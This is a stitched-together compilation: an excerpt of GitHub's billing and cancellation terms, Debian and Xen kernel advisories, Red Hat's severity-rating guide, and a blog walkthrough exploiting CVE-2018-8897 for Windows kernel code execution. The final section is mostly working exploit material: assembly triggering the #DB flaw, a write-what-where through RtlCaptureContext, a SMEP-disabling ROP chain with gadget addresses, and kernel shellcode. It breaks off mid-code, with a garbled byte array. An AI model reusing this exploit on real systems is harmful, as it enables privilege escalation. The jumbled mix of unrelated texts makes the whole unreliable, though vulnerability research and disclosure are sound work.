### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

By agreeing to these Terms, you are giving us permission to charge your on-file credit card, PayPal account, or other approved methods of payment for fees that you authorize for GitHub.

### [5. Responsibility for Payment](#5-responsibility-for-payment)

You are responsible for all fees, including taxes, associated with your use of the Service. By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service. If you dispute the matter, contact us through the [GitHub Support portal](https://support.github.com/). You are responsible for providing us with a valid means of payment for paid Accounts. Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

It is your responsibility to properly cancel your Account with GitHub. You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

GitHub has the right to suspend or terminate your access to all or any part of the Website at any time, with or without cause, with or without notice, effective immediately. GitHub reserves the right to refuse service to anyone for any reason at any time.

### [4. Survival](#4-survival)

All provisions of this Agreement which, by their nature, should survive termination *will* survive termination — including, without limitation: ownership provisions, warranty disclaimers, indemnity, and limitations of liability.

## [M. Communications with GitHub](#m-communications-with-github)

**Short version:** *We use email and other electronic means to stay in touch with our users.*

### [1. Electronic Communication Required](#1-electronic-communication-required)

For contractual purposes, you (1) consent to receive communications from us in an electronic form via the email address you have submitted or via the Service; and (2) agree that all Terms of Service, agreements, notices, disclosures, and other communications that we provide to you electronically satisfy any legal requirement that those communications would satisfy if they were on paper. This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation. Legal notice to GitHub must be in writing and [served on GitHub's legal agent](/en/site-policy/other-site-policies/guidelines-for-legal-requests-of-user-data#submitting-requests).

### [3. No Phone Support](#3-no-phone-support)

Package        : linux
Version        : 3.2.102-1
CVE ID         : CVE-2018-1093 CVE-2018-1130 CVE-2018-8897 CVE-2018-10940
Debian Bug     : 898100

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a denial of service.

CVE-2018-1093

    Wen Xu reported that a crafted ext4 filesystem image could trigger
    an out-of-bounds read in the ext4_valid_block_bitmap() function. A
    local user able to mount arbitrary filesystems could use this for
    denial of service.

CVE-2018-1130

    The syzbot software found that the DCCP implementation of
    sendmsg() does not check the socket state, potentially leading
    to a null pointer dereference.  A local user could use this to
    cause a denial of service (crash).

CVE-2018-8897

    Nick Peterson of Everdox Tech LLC discovered that #DB exceptions
    that are deferred by MOV SS or POP SS are not properly handled,
    allowing an unprivileged user to crash the kernel and cause a
    denial of service.

CVE-2018-10940

    Dan Carpenter reported that the cdrom driver does not correctly
    validate the parameter to the CDROM_MEDIA_CHANGED ioctl.  A user
    with access to a cdrom device could use this to cause a denial of
    service (crash).

For Debian 7 "Wheezy", these problems have been fixed in version
3.2.102-1.  This version also includes bug fixes from upstream version
3.2.102, including a fix for a regression in the SCTP implementation
in version 3.2.101.

We recommend that you upgrade your linux packages.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

            Xen Security Advisory CVE-2018-8897 / XSA-260
                              version 3

                 x86: mishandling of debug exceptions

UPDATES IN VERSION 3
====================

Normalize version tags by ensuring at least two spaces between glob
and tag.

ISSUE DESCRIPTION
=================

When switching stacks, it is critical to have a matching stack segment
and stack pointer.  To allow an atomic update from what would otherwise
be two adjacent instructions, an update which changes the stack segment
(either a mov or pop instruction with %ss encoded as the destination
register) sets the movss shadow for one instruction.

The exact behaviour of the movss shadow is poorly understood.

In practice, a movss shadow delays some debug exceptions (e.g. from a
hardware breakpoint) until the subsequent instruction has completed.  If
the subsequent instruction normally transitions to supervisor mode
(e.g. a system call), then the debug exception will be taken after the
transition to ring0 is completed.

For most transitions to supervisor mode, this only confuses Xen into
printing a lot of debugging information.  For the syscall instruction
however, the exception gets taken before the syscall handler can move
off the guest stack.

IMPACT
======

A malicious PV guest can escalate their privilege to that of the
hypervisor.

VULNERABLE SYSTEMS
==================

All versions of Xen are vulnerable.

Only x86 systems are vulnerable.  ARM systems are not vulnerable.

Only x86 PV guests can exploit the vulnerability.  x86 HVM and PVH
guests cannot exploit the vulnerability.

An attacker needs to be able to control hardware debugging facilities to
exploit the vulnerability, but such permissions are typically available
to unprivileged users.

MITIGATION
==========

Running only HVM or PVH guests avoids the vulnerability.

Note however that a compromised device model (running in dom0 or a
stub domain) can carry out this attack, so users with HVM domains are
also advised to patch their systems.

CREDITS
=======

This issue was discovered by Andy Lutomirski, and Nick Peterson of Everdox
Tech LLC.

RESOLUTION
==========

Applying the appropriate attached patch resolves this issue.

Package        : linux
CVE ID         : CVE-2018-1087 CVE-2018-8897
Debian Bug     : 897427 897599 898067 898100

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation or denial of service.

CVE-2018-1087

    Andy Lutomirski discovered that the KVM implementation did not
    properly handle #DB exceptions while deferred by MOV SS/POP SS,
    allowing an unprivileged KVM guest user to crash the guest or
    potentially escalate their privileges.

CVE-2018-8897

    Nick Peterson of Everdox Tech LLC discovered that #DB exceptions
    that are deferred by MOV SS or POP SS are not properly handled,
    allowing an unprivileged user to crash the kernel and cause a denial
    of service.

For the oldstable distribution (jessie), these problems have been fixed
in version 3.16.56-1+deb8u1. This update includes various fixes for
regressions from 3.16.56-1 as released in DSA-4187-1 (Cf. #897427,
#898067 and #898100).

For the stable distribution (stretch), these problems have been fixed in
version 4.9.88-1+deb9u1. The fix for CVE-2018-1108 applied in DSA-4188-1
is temporarily reverted due to various regression, cf. #897599.

We recommend that you upgrade your linux packages.

For the detailed security status of linux please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/linux>

# CVE-2018-8897

Demo exploitation of the POP SS vulnerability (CVE-2018-8897), leading to unsigned code execution with kernel privilages.

* KVA Shadowing should be disabled and [the relevant security update](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8897) should be uninstalled.
* This may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3.

# Arbitrary Code Execution at Ring 0 using CVE-2018-8897

![](https://blog.can.ac/wp-content/uploads/2020/04/EF49184E-56D7-4165-B4F3-A6F4E3798B7E-e1587490487648-110x110.jpg)[Can Bölük](https://blog.can.ac/author/can1357/ "Posts by Can Bölük")May 11, 2018[13](https://blog.can.ac/2018/05/11/arbitrary-code-execution-at-ring-0-using-cve-2018-8897/#comments)

Just a few days ago, a new vulnerability allowing an unprivileged user to run #DB handler with user-mode GSBASE was found by Nick Peterson ([@nickeverdox](https://twitter.com/nickeverdox)) and Nemanja Mulasmajic ([@0xNemi](https://twitter.com/0xNemi)). At the end of the whitepaper they published on [triplefault.io](http://triplefault.io), they mentioned that they were able to load and execute unsigned kernel code, which got me interested in the challenge; and that’s exactly what I’m going to attempt doing in this post.

Before starting, I would like to note that this exploit may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3. I debugged it by “simulating” this situation.

*Final source code can be found at the bottom.*

# 0x0: Setting Up the Basics

The fundamentals of this exploit is really simple unlike the exploitation of it. When stack segment is changed –whether via MOV or POP– until the next instruction completes interrupts are deferred. This is not a microcode bug but rather a feature added by Intel so that stack segment and stack pointer can get set at the same time.

However, many OS vendors missed this detail, which lets us raise a #DB exception as if it comes from CPL0 from user-mode.

We can create a deferred-to-CPL0 exception by setting debug registers in such a way that during the execution of stack-segment changing instruction a #DB will raise and calling *int 3* right after. int 3 will jump to KiBreakpointTrap, and before the first instruction of KiBreakpointTrap executes, our #DB will be raised.

As it is mentioned by the everdox and 0xNemi in the original whitepaper, this lets us run a kernel-mode exception handler with our user-mode GSBASE. Debug registers and XMM registers will also be persisted.

All of this can be done in a few lines like shown below:

```
#include <Windows.h>
#include <iostream>

void main()
{
  static DWORD g_SavedSS = 0;

  _asm
  {
    mov ax, ss
    mov word ptr [ g_SavedSS ], ax
  }

  CONTEXT Ctx = { 0 };
  Ctx.Dr0 = ( DWORD ) &g_SavedSS;
  Ctx.Dr7 = ( 0b1 << 0 ) | ( 0b11 << 16 ) | ( 0b11 << 18 );
  Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
  SetThreadContext( HANDLE( -2 ), &Ctx );

  PVOID FakeGsBase = ...;

  _asm
  {
    mov eax, FakeGsBase                     ; Set eax to fake gs base

    push 0x23
    push X64_End
    push 0x33
    push X64_Start
    retf

    X64_Start:
    __emit 0xf3								             ; wrgsbase eax
    __emit 0x0f
    __emit 0xae
    __emit 0xd8
    retf
    X64_End:

    ; Vulnerability
    mov ss, word ptr [ g_SavedSS ]			    ; Defer debug exception
    int 3                           		    ; Execute with interrupts disabled
    nop
  }
}
```

*This example is 32-bit for the sake of showing ASM and C together, the final working code will be 64-bit.*

Now let’s start debugging, we are in **KiDebugTrapOrFault** with our custom GSBASE! However, this is nothing but catastrophic, almost no function works and we will end up in a KiDebugTrapOrFault->KiGeneralProtectionFault->KiPageFault->KiPageFault->… infinite loop. If we had a perfectly valid GSBASE, the outcome of what we achieved so far would be a KMODE\_EXCEPTION\_NOT\_HANDLED BSOD**,** so let’s focus on making GSBASE function like the real one and try to get to KeBugCheckEx.

We can utilize a small IDA script to step to relevant parts faster:

```
#include <idc.idc>

static main()
{
  Message( "--- Step Till Next GS ---\n" );

  while( 1 )
  {
    auto Disasm = GetDisasmEx( GetEventEa(), 1 );
    if ( strstr( Disasm, "gs:" ) >= Disasm )
      break;
    StepInto();
    GetDebuggerEvent( WFNE_SUSP, -1 );
  }
}
```
# 0x1: Fixing the KPCR Data

Here are the few cases we have to modify GSBASE contents to pass through successfully:

### – KiDebugTrapOrFault

```
KiDebugTrapOrFault:
...
MEMORY:FFFFF8018C20701E ldmxcsr dword ptr gs:180h
```

Pcr.Prcb.MxCsr needs to have a valid combination of flags to pass this instruction or else it will raise a #GP. So let’s set it to its initial value, 0x1F80.

### – KiExceptionDispatch

```
KiExceptionDispatch:
...
MEMORY:FFFFF8018C20DB5F mov     rax, gs:188h
MEMORY:FFFFF8018C20DB68 bt      dword ptr [rax+74h], 8
```

Pcr.Prcb.CurrentThread is what resides in gs:188h. We are going to allocate a block of memory and reference it in gs:188h.

### – KiDispatchException

```
KiDispatchException:
...
MEMORY:FFFFF8018C12A4D8 mov     rax, gs:qword_188
MEMORY:FFFFF8018C12A4E1 mov     rax, [rax+0B8h]
```

This is Pcr.Prcb.CurrentThread.ApcStateFill.Process and again we are going to allocate a block of memory and simply make this pointer point to it.

```
KeCopyLastBranchInformation:
...
MEMORY:FFFFF8018C12A0AC mov     rax, gs:qword_20
MEMORY:FFFFF8018C12A0B5 mov     ecx, [rax+148h]
```

0x20 from GSBASE is Pcr.CurrentPrcb, which is simply Pcr + 0x180. Let’s set Pcr.CurrentPrcb to Pcr + 0x180 and also set Pcr.Self to &Pcr while on it.

### – RtlDispatchException

This one is going to be a little bit more detailed. RtlDispatchException calls RtlpGetStackLimits, which calls KeQueryCurrentStackInformation and *\_\_fastfail*s if it fails. The problem here is that KeQueryCurrentStackInformation checks the current value of RSP against Pcr.Prcb.RspBase, Pcr.Prcb.CurrentThread->InitialStack, Pcr.Prcb.IsrStack and if it doesn’t find a match it reports failure. We obviously cannot know the value of kernel stack from user-mode, so what to do?

There’s a weird check in the middle of the function:

```
char __fastcall KeQueryCurrentStackInformation(_DWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  ...
  if ( *(_QWORD *)(*MK_FP(__GS__, 392i64) + 40i64) == *MK_FP(__GS__, 424i64) )
  {
    ...
  }
  else
  {
    *v5 = 5;
    result = 1;
    *v3 = 0xFFFFFFFFFFFFFFFFi64;
    *v4 = 0xFFFF800000000000i64;
  }
  return result;
}
```

Thanks to this check, as long as we make sure KThread.InitialStack (KThread + 0x28) is not equal to Pcr.Prcb.RspBase (gs:1A8h) KeQueryCurrentStackInformation will return success with 0xFFFF800000000000-0xFFFFFFFFFFFFFFFF as the reported stack range. Let’s go ahead and set Pcr.Prcb.RspBase to 1 and Pcr.Prcb.CurrentThread->InitialStack to 0. Problem solved.

RtlDispatchException after these changes will fail without bugchecking and return to KiDispatchException.

### – KeBugCheckEx

We are finally here. Here’s the last thing we need to fix:

```
MEMORY:FFFFF8018C1FB94A mov     rcx, gs:qword_20
MEMORY:FFFFF8018C1FB953 mov     rcx, [rcx+62C0h]
MEMORY:FFFFF8018C1FB95A call    RtlCaptureContext
```

Pcr.CurrentPrcb->Context is where KeBugCheck saves the context of the caller and for some weird reason, it is a PCONTEXT instead of a CONTEXT. We don’t really care about any other fields of Pcr so let’s just set it to Pcr+ 0x3000 just for the sake of having a valid pointer for now.

# 0x2:  and Write|What|Where

And there we go, sweet sweet blue screen of victory!

![KMODE_EXCEPTION_NOT_HANDLED](https://blog.can.ac/wp-content/uploads/2018/05/okrUD.png)

Now that everything works, how can we exploit it?

The code after KeBugCheckEx is too complex to step in one by one and it is most likely not-so-fun to revert from so let’s try NOT to bugcheck this time.

I wrote another IDA script to log the points of interest (such as gs: accesses and jumps and calls to registers and [registers+x]) and made it step until  KeBugCheckEx is hit:

```
#include <idc.idc>

static main()
{
  Message( "--- Logging Points of Interest ---\n" );

  while( 1 )
  {
    auto IP = GetEventEa();
    auto Disasm = GetDisasmEx( IP, 1 );

    if
    (
      ( strstr( Disasm, "gs:" ) >= Disasm ) ||
      ( strstr( Disasm, "jmp r" ) >= Disasm ) ||
      ( strstr( Disasm, "call r" ) >= Disasm ) ||
      ( strstr( Disasm, "jmp" ) >= Disasm && strstr( Disasm, "[r" ) >= Disasm ) ||
      ( strstr( Disasm, "call" ) >= Disasm && strstr( Disasm, "[r" ) >= Disasm )
    )
    {
    Message( "-- %s (+%x): %s\n", GetFunctionName( IP ), IP - GetFunctionAttr( IP, FUNCATTR_START ), Disasm );
    }

    StepInto();
    GetDebuggerEvent( WFNE_SUSP, -1 );

    if( IP == ... )
    break;
  }
}

```

To my disappointment, there is no convenient jumps or calls. The whole output is:

```
- KiDebugTrapOrFault (+3d):                   test    word ptr gs:278h, 40h
- sub_FFFFF8018C207019 (+5):                  ldmxcsr dword ptr gs:180h
-- KiExceptionDispatch (+5f):                 mov     rax, gs:188h
--- KiDispatchException (+48):                mov     rax, gs:188h
--- KiDispatchException (+5c):                inc     gs:5D30h
---- KeCopyLastBranchInformation (+38):       mov     rax, gs:20hh
---- KeQueryCurrentStackInformation (+3b):    mov     rax, gs:188h
---- KeQueryCurrentStackInformation (+44):    mov     rcx, gs:1A8h
--- KeBugCheckEx (+1a):                       mov     rcx, gs:20h
```

This means that we have to find a way to write to kernel-mode memory and abuse that instead. RtlCaptureContext will be a tremendous help here. As I mentioned before, it is taking the context pointer from Pcr.CurrentPrcb->Context, which is weirdly a **PCONTEXT Context** and not a **CONTEXT Context**, meaning we can supply it any kernel address and make it write the context over it.

I was originally going to make it write over g\_CiOptions and continuously NtLoadDriver in another thread, but this idea did not work as well as I thought (That being said, appearently this is the way [@0xNemi](https://twitter.com/0xNemi) and [@nickeverdox](https://twitter.com/nickeverdox) got it working. I guess we will see what dark magic they used at BlackHat 2018.) simply because the current thread is stuck in an infinite loop and the other thread trying to NtLoadDriver will not succeed because of the IPI it uses:

> NtLoadDriver->…->MiSetProtectionOnSection->KeFlushMultipleRangeTb->IPI->Deadlock

After playing around with g\_CiOptions for 1-2 days, I thought of a much better idea: overwriting the return address of RtlCaptureContext.

How are we going to overwrite the return address without having access to RSP? If we use a little bit of creativity, we actually can have access to RSP. We can get the current RSP by making Prcb.Context point to a user-mode memory and polling Context.RSP value from a secondary thread. Sadly, this is not useful by itself as we already passed RtlCaptureContext (our write what where exploit).

However, if we could return back to KiDebugTrapOrFault after RtlCaptureContext finishes its work and somehow predict the next value of RSP, this would be extremely abusable; which is exactly what we are going to do.

To return back to KiDebugTrapOrFault, we will again use our lovely debug registers. Right after RtlCaptureContext returns, a call to KiSaveProcessorControlState is made.

```
.text:000000014017595F                 mov     rcx, gs:20h
.text:0000000140175968                 add     rcx, 100h

.text:0000000140175C86                 mov     rax, cr2
.text:0000000140175C89                 mov     [rcx+8], rax
.text:0000000140175C8D                 mov     rax, cr3

.text:0000000140175C9F                 mov     [rcx+0A0h], rax
```

We will set DR1 on gs:20h + 0x100 + 0xA0, and make KeBugCheckEx return back to KiDebugTrapOrFault just after it saves the value of CR4.

To overwrite the return pointer, we will first let KiDebugTrapOrFault->…->RtlCaptureContext execute once giving our user-mode thread an initial RSP value, then we will let it execute another time to get the new RSP, which will let us calculate per-execution RSP difference. This RSP delta will be constant because the control flow is also constant.

Now that we have our RSP delta, we will predict the next value of RSP, subtract 8 from that to calculate the return pointer of RtlCaptureContext and make Prcb.Context->Xmm13 – Prcb.Context->Xmm15 written over it.

Thread logic will be like the following:

```
volatile PCONTEXT Ctx = *( volatile PCONTEXT* ) ( Prcb + Offset_Prcb__Context );

while ( !Ctx->Rsp );											                // Wait for RtlCaptureContext to be called once so we get leaked RSP
uint64_t StackInitial = Ctx->Rsp;
while ( Ctx->Rsp == StackInitial );								       // Wait for it to be called another time so we get the stack pointer difference
                                                          // between sequential KiDebugTrapOrFault
StackDelta = Ctx->Rsp - StackInitial;
PredictedNextRsp = Ctx->Rsp + StackDelta;						     // Predict next RSP value when RtlCaptureContext is called
uint64_t NextRetPtrStorage = PredictedNextRsp - 0x8;			// Predict where the return pointer will be located at
NextRetPtrStorage &= ~0xF;
*( uint64_t* ) ( Prcb + Offset_Prcb__Context ) = NextRetPtrStorage - Offset_Context__XMM13;
                                                          // Make RtlCaptureContext write XMM13-XMM15 over it
```

Now we simply need to set-up a ROP chain and write it to XMM13-XMM15. We cannot predict which half of XMM15 will get hit due to the mask we apply to comply with the movaps alignment requirement, so first two pointers should simply point at a [RETN] instruction.

We need to load a register with a value we choose to set CR4 so XMM14 will point at a [POP RCX; RETN] gadget, followed by a valid CR4 value with SMEP disabled. As for XMM13, we are simply going to use a [MOV CR4, RCX; RETN;] gadget followed by a pointer to our shellcode.

The final chain will look something like:

```
-- &retn;                (fffff80372e9502d)
-- &retn;                (fffff80372e9502d)
-- &pop rcx; retn;       (fffff80372ed9122)
-- cr4_nosmep            (00000000000506f8)
-- &mov cr4, rcx; retn;  (fffff803730045c7)
-- &KernelShellcode      (00007ff613fb1010)
```

In our shellcode, we will need to restore the CR4 value, swapgs, rollback ISR stack, execute the code we want and IRETQ back to user-mode which can be done like below:

```
NON_PAGED_DATA fnFreeCall k_ExAllocatePool = 0;

using fnIRetToVulnStub = void( * )  ( uint64_t Cr4, uint64_t IsrStack, PVOID ContextBackup );

  0x4C, 0x89, 0xC1,		// mov rcx, r8  ; rcx = ContextBackup
  0xFB,				        // sti          ; enable interrupts
  0x48, 0xCF			     // iretq        ; interrupt return
};

NON_PAGED_CODE void KernelShellcode()
{
  __writedr( 7, 0 );

  uint64_t Cr4Old = __readgsqword( Offset_Pcr__Prcb + Offset_Prcb__Cr4 );
  __writecr4( Cr4Old & ~( 1 << 20 ) );

  __swapgs();

  uint64_t IsrStackIterator = PredictedNextRsp - StackDelta - 0x38;

